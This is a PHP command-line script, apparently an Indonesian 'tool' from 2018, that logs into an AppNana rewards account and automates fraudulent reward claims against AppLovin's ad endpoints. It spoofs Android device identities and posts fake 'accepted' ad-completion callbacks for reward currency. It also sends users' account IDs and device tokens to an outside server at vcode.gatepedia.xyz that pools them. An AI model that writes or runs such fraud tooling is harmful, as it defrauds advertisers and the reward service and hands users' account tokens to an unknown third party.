<?php
echo "\033[31m*Script ini dibuat oleh Alfian Ananda Putra (@pianjammalam) pada tanggal 28 Oktober 2018. \n";
echo "\033[31m*Tidak di perbolehkan untuk mengedit atau menulis ulang kode! \n \n";
echo "\033[1;36mMasukkan Email APPNANA : ";
$email = trim(fgets(STDIN));
echo "\033[1;36mMasukkan Password APPNANA : ";
$password = trim(fgets(STDIN));
// Login Time


function generateDeviceId() {
    $megaRandomHash = md5(number_format(microtime(true), 7, '', ''));
    return ''.substr($megaRandomHash, 16);
}

function generateUUID($keepDashes = true) {
        $uuid = sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
    return $keepDashes ? $uuid : str_replace('-', '', $uuid);
}

$idfa   =   generateUUID();

$signkey    =           rand(111,99999999);

$gid        =           generateDeviceId();

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://appnana2.mapiz.com/api/nanaer_login/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email=".urldecode($email)."&password=".urldecode($password)."&source=Android.google-play&signkey=".$signkey."&android_id=".$gid."&version=3.5.9&gaid=".$idfa."&gaid_enabled=true");
curl_setopt($ch, CURLOPT_POST, 1);

$headers = array();
$headers[] = "Accept: application/json; version=1.2";
$headers[] = "User-Agent: com.appnana.android.giftcardrewards/3.5.9 (Linux; U; Android 4.4.4; in-ID; GT-I9060I Build/KTU84P; samsung) 480X800 samsung GT-I9060I";
$headers[] = "Accept-Language: in-ID";
$headers[] = "Host: appnana2.mapiz.com";
$headers[] = "Content-Type: application/x-www-form-urlencoded";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$httpcode  = curl_getinfo($ch);
$header    = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
$body      = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
$resultzz = array($header, $body, $httpcode,$result);

preg_match_all('%Set-Cookie: (.*?);%',$resultzz[0],$d);$cookie = '';
for($o=0;$o<count($d[0]);$o++)$cookie.=$d[1][$o].";";

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://appnana2.mapiz.com/api/get_nanaer_info/?email=".urldecode($email));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");


$headers = array();
$headers[] = "Accept: application/json; version=1.2";
$headers[] = "User-Agent: com.appnana.android.giftcardrewards/3.5.9 (Linux; U; Android 4.4.4; in-ID; GT-I9060I Build/KTU84P; samsung) 480X800 samsung GT-I9060I";
$headers[] = "Accept-Language: in-ID";
$headers[] = "Host: appnana2.mapiz.com";
$headers[] = "Cookie: ".$cookie;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/device?api_key=wT2o5DOKtwBs_nrNr8rVnBTkEGJV4Q_-v1m_F9J63Vz3GoQ6wFcgQ4PfKi9O89N1A80PHKWKqTN5FpCA2psTuF");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"sc":"","app_info":{"ic":true,"installed_at":15406811'.rand(11111,99999).',"installer_name":"com.android.vending","package_name":"com.appnana.android.giftcardrewards","app_version":"3.5.9","first_install":"true","applovin_sdk_version":"8.1.4","app_name":"AppNana"},"device_info":{"os":"4.4.4","adr":"0","model":"GT-I9060I","hardware":"sc8830","tz_offset":7,"gy":false,"adnsd":240,"locale":"in_ID","sdk_version":19,"dnt":"false","type":"android","country_code":"","brand_name":"samsung","revision":"grandneove3g","adns":1.5,"volume":53,"sim":"0","carrier":"INDOSAT","brand":"samsung","orientation_lock":"portrait","idfa":"'.$idfa.'","wvvc":0},"stats":{"TaskFetchBasicSettings_time":'.rand(1111,4444).',"TaskFetchBasicSettings_count":1}}');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = "Content-Type: application/json; charset=utf-8";
$headers[] = "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; GT-I9060I Build/KTU84P)";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$resultAkhir = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);


$resultAwal  = json_encode(array("userId" => json_decode($result,true)['response']['id'],"currentDeviceId" => json_decode($result,true)['response']['current_device_id'],"fullUserId" => json_decode($result,true)['response']['id']."z".json_decode($result,true)['response']['current_device_id'],"deviceId" => json_decode($resultAkhir,true)['results'][0]['device_id'],"vx" => json_decode($resultAkhir,true)['results'][0]['vx'],"deviceToken" => json_decode($resultAkhir,true)['results'][0]['device_token'],"appId" => json_decode($resultAkhir,true)['results'][0]['app_id'],"nanasBalance" => json_decode($result,true)['response']['nanas'],"idfa" => $idfa));



if(!empty(json_decode($resultAwal,true)['userId'])){
  echo "\nBerhasil login ke akun ".json_decode($resultAwal,true)['userId']." | Balance \033[1;33m ".json_decode($resultAwal,true)['nanasBalance']."\033[0m (Balance merupakan data terakhir di database, tidak akan terupdate) Your idfa:".$idfa."| Your gid:".$gid."| Your signkey:".$signkey." \n";
  echo "Terimakasih sudah menggunakan tools kami. Jangan lupa follow @pianjammalam untuk mendapatkan update terbaru. \n";
  echo "Ingin menjadi apa anda?  \n";
  echo "ketik \033[0;36ma\033[0m untuk berperan menjadi \033[0;36  planter(penanam)\033[0m \n";
  echo "ketik \033[0;32mb\033[0m untuk berperan menjadi \033[0;32  treat(merawat)\033[0m \n";
  //echo "ketik \033[1;31mc\033[0m untuk berperan menjadi \033[1;31  harvesters(pemanen)\033[0m \n >>> ";
  //echo "ketik \033[1;31md\033[0m untuk berperan menjadi \033[1;31  agricultural expert(ahli pertanian)\033[0m \n >>> ";
  $option = trim(fgets(STDIN));
  
  if(strtolower($option)    ==  'a'){
      echo "\nAnda berperan sebagai \033[1;33mplanter(penanam)\033[0m, bekerja untuk menanamkan semua iklan yang ada dari APPNANA(Applovin) sebagai akun yang terdaftar di database. Jadi kamu membantu semua user yang menggunakan tools ini untuk menanamkan iklan. \n Aplikasi akan mulai dalam 5 detik ... \n";
      sleep(5);
      
      
      while(1){
        $listAkun =   file_get_contents('http://vcode.gatepedia.xyz/loginuserdata.php');
          $explode    =   explode('
',$listAkun);
        
        foreach($explode as $k){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://a.applovin.com/3.0/ad?accept=custom_size,launch_app,video&v4=true&api_did=".explode('|',$k)[3]."&zone_id=inter_videoa_direct&country_code=ID&sim=0&carrier=INDOSAT&preloading=false&idfa=".explode('|',$k)[2]."&wvvc=353806410&dy=1920&format=json&orientation_lock=portrait&adns=3.0&sdk_key=wT2o5DOKtwBs_nrNr8rVnBTkEGJV4Q_-v1m_F9J63Vz3GoQ6wFcgQ4PfKi9O89N1A80PHKWKqTN5FpCA2psTuF&gy=true&v1=true&brand_name=asus&sc=".$sc."&si=0&volume=66&dnt=false&dx=1080&locale=in_ID&revision=Z00A_1&ia=15406019".rand(00000,99999)."&li=".rand(1,99999999)."&adr=0&os=5.0&v3=true&tz_offset=7.0&network=wifi&platform=android&app_version=3.5.9&adnsd=480&build=103&installer_name=com.android.vending&brand=asus&sdk_version=8.1.4&v2=true&pnr=false&vz=1e89c69ab45abdfb&hardware=mofd_v1&model=ASUS_Z00AD");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
                
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
                
            $headers = array();
            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
            $headers[] = "Host: a.applovin.com";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                
            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close ($ch);
            $GLOBALS['sc']  = json_decode($result,true)['settings']['sc'];
            $tanamiklan =   file_get_contents('http://vcode.gatepedia.xyz/tanam.php?userid='.explode('|',$k)[0].'&devicetoken='.json_decode($resultAwal,true)['deviceToken'].'&clc='.json_decode($result,true)['clcode'].'&codesc='.json_decode($result,true)['settings']['sc'].'&command=insert');
            if(!empty(json_decode($result,true)['ad_size'])){
                echo "\033[1;34m".explode('|',$k)[0]." | Sukses \033[0m \n";
            }else{
                echo "\033[31m".explode('|',$k)[0]." | Gagal \033[0m \n";
            }
        }
      }
      
  }else if(strtolower($option)    ==  'b'){
      
      echo "\nAnda berperan sebagai\033[1;33m treat(merawat)\033[0m, bekerja untuk merawat iklan yang sudah disimpan didalam database, seperti memberi pupuk, menyirami air, membersihkan hama, dan lain lain. Jadi kamu membantu semua user yang menggunakan tools ini untuk merawat iklan yang ada di database. \n Aplikasi akan mulai dalam 5 detik ... \n";
      sleep(5);
      
      while(1){
          $listIklan =   file_get_contents('http://vcode.gatepedia.xyz/tanamdata.php');
          $explode    =   explode('
',$listIklan);
        
        foreach($explode as $k){
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/vr?device_token=".explode('|',$k)[3]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.explode('|',$k)[2].'","user_id":"'.explode('|',$k)[1].'","zone_id":"inter_videoa_direct"}');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            
            $headers = array();
            $headers[] = "Content-Type: application/json; charset=utf-8";
            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
            $headers[] = "Host: d.applovin.com";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close ($ch);
          
          $akun = explode('|',$k)[1];
            
            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
                echo "\033[1;34m Akun : ".$akun." >".explode('|',$k)[0]."< | Sudah di siram, di beri pupuk. Tinggal Lu panen cuk \033[0m \n";
              file_get_contents('http://vcode.gatepedia.xyz/siappanen.php?userid='.$akun.'&devicetoken='.explode('|',$k)[3].'&clc='.explode('|',$k)[2].'&codesc=lahauya&command=insert');
              file_get_contents('http://vcode.gatepedia.xyz/deletelagi.php?id='.explode('|',$k)[0]);
            }else{
                echo "\033[31m Akun : ".$akun." >".explode('|',$k)[0]."< | Kena hama coy:( Gagal Panen kita. \033[0m \n";
                file_get_contents('http://vcode.gatepedia.xyz/deletelagi.php?id='.explode('|',$k)[0]);
            }
            
            sleep(1);
            
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/cr?device_token=MaznYs97JTiqaqEwnZGZ5sWF8XoG6dKjdbFQZwnQIOojzoI_OYk3-ffGUUxuxMb7trEt_0KG3bL5mwnKz1hy--oy_FsLvL7-Sr6hraq_7POC3gwyj5wdHcgQvtzlHemMXKIBQRWQuI1sIJ-lrDF4dbMiXLwC2O6k1RXvNCNfhgM=");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.explode('|',$k)[2].'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.$akun.'"}');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            
            $headers = array();
            $headers[] = "Content-Type: application/json; charset=utf-8";
            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
            $headers[] = "Host: d.applovin.com";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close ($ch);
            
            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
                echo "\033[1;34m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | cieee.. berhasil panen. Jangan lupa follow @pianjammalam \033[0m \n";
              file_get_contents('http://vcode.gatepedia.xyz/deletelagi.php?id='.explode('|',$k)[0]);
            }else{
                echo "\033[31m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | Tuh kan ! ngerawatnya gak bener nih, jadinya gagal panen! \033[0m \n";
                file_get_contents('http://vcode.gatepedia.xyz/deletelagi.php?id='.explode('|',$k)[0]);
            }
        }
      }
      
  
  }else if(strtolower($option)    ==  'c'){
      
      echo "\nAnda berperan sebagai\033[1;33m harvesters(pemanen)\033[0m, bekerja untuk memanen semua iklan yang sudah siap. Tapi hati-hati, tidak semua hasil panen memiliki nilai! dan hati-hati kalau ada hama di ladang mu!. \n Aplikasi akan mulai dalam 5 detik ... \n";
      sleep(5);
      
      while(1){
          $listIklan =   file_get_contents('http://vcode.gatepedia.xyz/panendata.php');
          $explode    =   explode('
',$listIklan);
        
        foreach($explode as $k){
            $clcode =   explode('|',$k)[2];
          
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/cr?device_token=".explode('|',$k)[3]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = "Content-Type: application/json; charset=utf-8";
            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
            $headers[] = "Host: d.applovin.com";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close ($ch);
            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
                echo "\033[1;34m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | cieee.. berhasil panen. Jangan lupa follow @pianjammalam \033[0m \n";
                file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
            }else{
                echo "\033[31m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | Tuh kan ! ngerawatnya gak bener nih, jadinya gagal panen! \033[0m \n";
              //print_r($result);
              //echo $clcode." \n";
              //echo '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}';
              //echo '\n'.explode('|',$k)[3]; 
              file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
            }
        }
      }
      
  
  }else if(strtolower($option)    ==  'd'){
      
      
      echo "\nAnda berperan sebagai\033[1;33m agricultural expert(ahli pertanian)\033[0m, bekerja untuk memeriksa tanaman tanaman yang di rawat oleh treat. Terkadang treat memberi pupuk terlalu sedikit maupun terlalu banyak, sehingga banyak tanaman(iklan) yang mati. \n Aplikasi akan mulai dalam 5 detik ... \n";
      sleep(5);
      
      while(1){
          $listIklan =   file_get_contents('http://vcode.gatepedia.xyz/panendata.php');
          $explode    =   explode('
',$listIklan);
        
        foreach($explode as $k){
            $clcode =   explode('|',$k)[2];
          
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, "https://d.applovin.com/cr?device_token=".explode('|',$k)[3]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

            $headers = array();
            $headers[] = "Content-Type: application/json; charset=utf-8";
            $headers[] = "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; ASUS_Z00AD Build/LRX21V)";
            $headers[] = "Host: d.applovin.com";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $result = curl_exec($ch);
            if (curl_errno($ch)) {
                echo 'Error:' . curl_error($ch);
            }
            curl_close ($ch);
            if(json_decode($result,true)['results'][0]['result'] == 'accepted'){
                echo "\033[1;34m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | cieee.. berhasil panen. Jangan lupa follow @pianjammalam \033[0m \n";
                file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
            }else{
                //echo "\033[31m Akun : ".explode('|',$k)[1]." >".explode('|',$k)[0]."< | Tuh kan ! ngerawatnya gak bener nih, jadinya gagal panen! \033[0m \n";
              //print_r($result);
              echo $clcode." \n";
              //echo '{"clcode":"'.$clcode.'","fire_percent":-1,"zone_id":"inter_videoa_direct","result":"accepted","params":{"amount":"5.000000","currency":"Nanas"},"user_id":"'.explode('|',$k)[1].'"}';
              //echo '\n'.explode('|',$k)[3]; 
              file_get_contents('http://vcode.gatepedia.xyz/delete.php?id='.$clcode);
            }
        }
      }
      
  
  
  }
  
  
}else{
    //echo "\nGagal Login \n";
            print_r($resultAwal);
}
